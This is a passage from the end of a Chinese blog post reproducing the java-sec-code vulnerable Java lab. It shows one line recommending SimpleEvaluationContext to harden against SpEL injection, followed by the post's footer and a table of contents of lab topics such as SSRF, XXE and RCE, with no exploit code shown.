punctuation">&#125;</span></pre></td></tr></table></figure><p>使用 SimpleEvaluationContext 进行加固，定义一个只读的上下文环境防止不安全的操作</p>

  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2025-07-24 19:37:53" itemprop="dateModified" datetime="2025-07-24T19:37:53+08:00">2025-07-24</time>
  </span>
  <span id="2025/07/08/java-sec-code复现/" class="item leancloud_visitors" data-flag-title="java-sec-code复现" title="Views">
      <span class="icon">
        <i class="ic i-eye"></i>
      </span>
      <span class="text">Views</span>
      <span class="leancloud-visitors-count"></span>
      <span class="text">times</span>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="ztyzty WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="ztyzty Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="ztyzty PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>ztyzty <i class="ic i-at"><em>@</em></i>网安
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/" title="java-sec-code复现">http://odiws.github.io/2025/07/08/java-sec-code复现/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2025/06/17/ecshop%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?609588" title="ecshop复现">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>ecshop复现</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2025/07/11/YLctf2024/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?668548" title="Untitled">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>Untitled</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java-sec-code%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text"> java-sec-code 靶场复现：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cmdinject"><span class="toc-number">1.1.</span> <span class="toc-text"> Cmdinject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#codeinject"><span class="toc-number">1.1.1.</span> <span class="toc-text"> &#x2F;codeinject</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#start%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.1.1.</span> <span class="toc-text"> start（）函数详解：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%8A%8A%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%95%B0%E7%BB%84"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text"> 1. 把命令参数转换为字符串数组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%8F%82%E6%95%B0%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.1.1.2.</span> <span class="toc-text"> 2. 参数检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%90%8D%E5%91%BD%E4%BB%A4%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%85%83%E7%B4%A0"><span class="toc-number">1.1.1.1.3.</span> <span class="toc-text"> 3. 获取要执行的程序名（命令第一个元素）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.1.1.4.</span> <span class="toc-text"> 4. 安全管理器检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E8%8E%B7%E5%8F%96%E6%89%A7%E8%A1%8C%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84"><span class="toc-number">1.1.1.1.5.</span> <span class="toc-text"> 5. 获取执行目录路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E6%A3%80%E6%9F%A5%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E4%B8%AD%E6%98%AF%E5%90%A6%E5%90%AB%E6%9C%89%E9%9D%9E%E6%B3%95%E7%9A%84%E7%A9%BA%E5%AD%97%E7%AC%A6"><span class="toc-number">1.1.1.1.6.</span> <span class="toc-text"> 6. 检查命令参数中是否含有非法的空字符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.1.1.1.7.</span> <span class="toc-text"> 7. 启动进程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#codeinjecthost"><span class="toc-number">1.1.2.</span> <span class="toc-text"> &#x2F;codeinject&#x2F;host</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jsonp"><span class="toc-number">1.2.</span> <span class="toc-text"> jsonp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.3.</span> <span class="toc-text"> 文件上传：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.4.</span> <span class="toc-text"> 目录穿越</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text"> SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#raw-sql"><span class="toc-number">1.5.0.1.</span> <span class="toc-text"> raw sql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#incorrect-preparestatement"><span class="toc-number">1.5.0.2.</span> <span class="toc-text"> Incorrect prepareStatement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#incorrect-mybatis"><span class="toc-number">1.5.0.3.</span> <span class="toc-text"> Incorrect mybatis</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%96%B9%E6%A1%88"><span class="toc-number">1.5.0.3.1.</span> <span class="toc-text"> 防护方案：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf"><span class="toc-number">1.6.</span> <span class="toc-text"> ssrf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1ssrfurlconnectionvuln"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 1. 路由 &#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%AF%E7%94%B1ssrfhttpurlconnectionvuln"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 2. 路由 &#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E8%B7%AF%E7%94%B1ssrfopenstream"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 3. 路由 &#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%B7%AF%E7%94%B1ssrfhttpsyncclientsvuln"><span class="toc-number">1.6.4.</span> <span class="toc-text"> 4. 路由 &#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E8%B7%AF%E7%94%B1ssrfresttemplatevuln1"><span class="toc-number">1.6.5.</span> <span class="toc-text"> 5. 路由 &#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E8%B7%AF%E7%94%B1ssrfresttemplatevuln2"><span class="toc-number">1.6.6.</span> <span class="toc-text"> 6. 路由 &#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E8%B7%AF%E7%94%B1ssrfhutoolvuln"><span class="toc-number">1.6.7.</span> <span class="toc-text"> 7. 路由 &#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E8%B7%AF%E7%94%B1ssrfdnsrebindvuln"><span class="toc-number">1.6.8.</span> <span class="toc-text"> 8. 路由 &#x2F;ssrf&#x2F;dnsrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dns%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">1.6.9.</span> <span class="toc-text"> DNS 重绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dns"><span class="toc-number">1.6.9.1.</span> <span class="toc-text"> dns:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dns%E7%9A%84%E8%AE%B0%E5%BD%95%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.6.9.2.</span> <span class="toc-text"> DNS 的记录类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dns%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF"><span class="toc-number">1.6.9.3.</span> <span class="toc-text"> DNS 绑定技术：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dns%E9%87%8D%E7%BB%91%E5%AE%9A-2"><span class="toc-number">1.6.9.4.</span> <span class="toc-text"> DNS 重绑定：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%80%9D%E8%B7%AF"><span class="toc-number">1.6.9.5.</span> <span class="toc-text"> 防御思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce"><span class="toc-number">1.7.</span> <span class="toc-text"> rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1rceruntimeexec"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 1. 路由 &#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%AF%E7%94%B1rceprocessbuilder"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 2. 路由 &#x2F;rce&#x2F;processBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E8%B7%AF%E7%94%B1rcejscmd"><span class="toc-number">1.7.3.</span> <span class="toc-text"> 3. 路由 &#x2F;rce&#x2F;jscmd</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#image-20250710111939201"><span class="toc-number">1.7.3.1.</span> <span class="toc-text"> </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%B7%AF%E7%94%B1rcevulnyarm"><span class="toc-number">1.7.4.</span> <span class="toc-text"> 4. 路由 &#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E8%B7%AF%E7%94%B1rcegroovy"><span class="toc-number">1.7.5.</span> <span class="toc-text"> 5. 路由 &#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti"><span class="toc-number">1.8.</span> <span class="toc-text"> SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#velocityevaluate"><span class="toc-number">1.8.1.</span> <span class="toc-text"> Velocity.evaluate</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf"><span class="toc-number">1.9.</span> <span class="toc-text"> CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1csrfpost"><span class="toc-number">1.9.1.</span> <span class="toc-text"> 1. 路由 &#x2F;csrf&#x2F;post</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#csrf%E9%98%B2%E6%8A%A4"><span class="toc-number">1.9.1.1.</span> <span class="toc-text"> csrf 防护：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8csrf-token"><span class="toc-number">1.9.1.1.1.</span> <span class="toc-text"> 使用 CSRF Token：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#samesite-cookie-%E5%B1%9E%E6%80%A7"><span class="toc-number">1.9.1.1.2.</span> <span class="toc-text"> SameSite Cookie 属性：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8C%E9%87%8Dcookie%E9%AA%8C%E8%AF%81"><span class="toc-number">1.9.1.1.3.</span> <span class="toc-text"> 双重 Cookie 验证：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5referer%E5%A4%B4"><span class="toc-number">1.9.1.1.4.</span> <span class="toc-text"> 检查 Referer 头：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#captcha"><span class="toc-number">1.9.1.1.5.</span> <span class="toc-text"> CAPTCHA：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-number">1.10.</span> <span class="toc-text"> XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1xssreflext"><span class="toc-number">1.10.1.</span> <span class="toc-text"> 1. 路由 &#x2F;xss&#x2F;reflext：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%AF%E7%94%B1xssstored"><span class="toc-number">1.10.2.</span> <span class="toc-text"> 2. 路由 &#x2F;xss&#x2F;stored</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="toc-number">1.10.3.</span> <span class="toc-text"> XSS 攻击防护：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe"><span class="toc-number">1.11.</span> <span class="toc-text"> XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1xxexmlreadervuln"><span class="toc-number">1.11.1.</span> <span class="toc-text"> 1. 路由 &#x2F;xxe&#x2F;xmlReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%AF%E7%94%B1xxesaxbuildervuln"><span class="toc-number">1.11.2.</span> <span class="toc-text"> 2. 路由 &#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-number">1.11.2.1.</span> <span class="toc-text"> 修复代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E8%B7%AF%E7%94%B1xxesaxreadervuln"><span class="toc-number">1.11.3.</span> <span class="toc-text"> 3. 路由 &#x2F;xxe&#x2F;SAXReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E7%9A%84%E5%81%9A%E6%B3%95"><span class="toc-number">1.11.4.</span> <span class="toc-text"> 通用的做法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#external-dtd%E5%A4%96%E9%83%A8-dtd-%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93parameter-entity%E5%AE%9E%E7%8E%B0%E7%9A%84-blind-xxe-%E5%A4%96%E5%B8%A6%E6%94%BB%E5%87%BB"><span class="toc-number">1.11.4.1.</span> <span class="toc-text"> External DTD（外部 DTD）+ 参数实体（Parameter Entity）实现的 Blind XXE 外带攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%B7%AF%E7%94%B1xxesaxparservuln"><span class="toc-number">1.11.5.</span> <span class="toc-text"> 4. 路由 &#x2F;xxe&#x2F;SAXParser&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E8%B7%AF%E7%94%B1xxedigestervuln"><span class="toc-number">1.11.6.</span> <span class="toc-text"> 5. 路由 &#x2F;xxe&#x2F;Digester&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E8%B7%AF%E7%94%B1xxedocumentbuildervuln"><span class="toc-number">1.11.7.</span> <span class="toc-text"> 6. 路由 &#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E8%B7%AF%E7%94%B1xxedocumentbuilderxincludevuln"><span class="toc-number">1.11.8.</span> <span class="toc-text"> 7. 路由 &#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E8%B7%AF%E7%94%B1xxexmlreadervuln"><span class="toc-number">1.11.9.</span> <span class="toc-text"> 8. 路由 &#x2F;xxe&#x2F;XMLReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%E8%B7%AF%E7%94%B1xxedocumenthelpervuln"><span class="toc-number">1.11.10.</span> <span class="toc-text"> 9. 路由 &#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E8%BF%B0%E5%AD%98%E5%9C%A8xxe%E6%BC%8F%E6%B4%9E%E5%BA%93%E5%AF%B9%E6%AF%94"><span class="toc-number">1.11.11.</span> <span class="toc-text"> 上述存在 XXE 漏洞库对比</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8payload"><span class="toc-number">1.11.11.1.</span> <span class="toc-text"> 统一漏洞利用 payload：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-number">1.11.11.2.</span> <span class="toc-text"> 统一修复代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10%E8%B7%AF%E7%94%B1xxexmlbeamvuln"><span class="toc-number">1.11.12.</span> <span class="toc-text"> 10. 路由 &#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1ooxmlreadxlsx"><span class="toc-number">1.11.13.</span> <span class="toc-text"> 路由 &#x2F;ooxml&#x2F;readxlsx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12%E8%B7%AF%E7%94%B1xlsx-streamerreadxlsx"><span class="toc-number">1.11.14.</span> <span class="toc-text"> 12. 路由 &#x2F;xlsx-streamer&#x2F;readxlsx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie%E4%BC%AA%E9%80%A0"><span class="toc-number">1.12.</span> <span class="toc-text"> cookie 伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1cookievuln01"><span class="toc-number">1.12.1.</span> <span class="toc-text"> 1. 路由 &#x2F;cookie&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%AF%E7%94%B1cookievuln02"><span class="toc-number">1.12.2.</span> <span class="toc-text"> 2. 路由 &#x2F;cookie&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E8%B7%AF%E7%94%B1cookievuln03"><span class="toc-number">1.12.3.</span> <span class="toc-text"> 3. 路由 &#x2F;cookie&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E8%B7%AF%E7%94%B1cookievuln04"><span class="toc-number">1.12.4.</span> <span class="toc-text"> 4. 路由 &#x2F;cookie&#x2F;vuln04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E8%B7%AF%E7%94%B1cookievuln05"><span class="toc-number">1.12.5.</span> <span class="toc-text"> 5. 路由 &#x2F;cookie&#x2F;vuln05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E8%B7%AF%E7%94%B1cookievuln06"><span class="toc-number">1.12.6.</span> <span class="toc-text"> 6. 路由 &#x2F;cookie&#x2F;vuln06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.12.7.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cors"><span class="toc-number">1.13.</span> <span class="toc-text"> CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%B7%AF%E7%94%B1corsvulnorigin"><span class="toc-number">1.13.1.</span> <span class="toc-text"> 1. 路由 &#x2F;cors&#x2F;vuln&#x2F;origin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%B7%AF%E7%94%B1corsvulnsetheader"><span class="toc-number">1.13.2.</span> <span class="toc-text"> 2. 路由 &#x2F;cors&#x2F;vuln&#x2F;setHeader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E8%B7%AF%E7%94%B1corsvulncrossorigin"><span class="toc-number">1.13.3.</span> <span class="toc-text"> 3. 路由 &#x2F;cors&#x2F;vuln&#x2F;crossOrigin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">1.13.4.</span> <span class="toc-text"> 漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">1.14.</span> <span class="toc-text"> 目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1path_traversalvul"><span class="toc-number">1.14.1.</span> <span class="toc-text"> 路由 &#x2F;path_traversal&#x2F;vul</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-number">1.14.1.1.</span> <span class="toc-text"> 漏洞代码：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-2"><span class="toc-number">1.15.</span> <span class="toc-text"> 文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.16.</span> <span class="toc-text"> SpEL 表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1spelvuln1"><span class="toc-number">1.16.1.</span> <span class="toc-text"> 路由 &#x2F;spel&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1spelvuln2"><span class="toc-number">1.16.2.</span> <span class="toc-text"> 路由 &#x2F;spel&#x2F;vuln2</span></a></li></ol></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="ztyzty"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">ztyzty</p>
  <div class="description" itemprop="description">学无止境</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">180</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">12</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">141</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2025/06/17/ecshop%E5%A4%8D%E7%8E%B0/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2025/07/11/YLctf2024/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2025/04/17/springweb/" title="springweb">springweb</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/08/15/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="[安洵杯2019]不是文件上传">[安洵杯2019]不是文件上传</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/09/06/SWPU2019-Web4/" title="[SWPU2019]Web4">[SWPU2019]Web4</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="In 比赛复现">比赛复现</a>
</div>

    <span><a href="/2025/02/24/vnctf%E5%A4%8D%E7%8E%B0/" title="vnctf复现">vnctf复现</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme/" title="[极客大挑战-2020]Roamphp4-Rceme">[极客大挑战-2020]Roamphp4-Rceme</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/09/25/DDCTF2019-homebreweventloop/" title="[DDCTF2019]homebreweventloop">[DDCTF2019]homebreweventloop</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/10/11/GYCTF2020-NodeGame-nodejs/" title="[GYCTF2020]NodeGame-nodejs">[GYCTF2020]NodeGame-nodejs</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/10/17/RCTF2019-Nextphp/" title="[RCTF2019]Nextphp">[RCTF2019]Nextphp</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/06/10/2018-Comment/" title="&#39;[网鼎杯 2018]Comment&#39;">'[网鼎杯 2018]Comment'</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
</div>

    <span><a href="/2024/12/01/LineCTF2022-BB/" title="[LineCTF2022]BB">[LineCTF2022]BB</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2025</span>
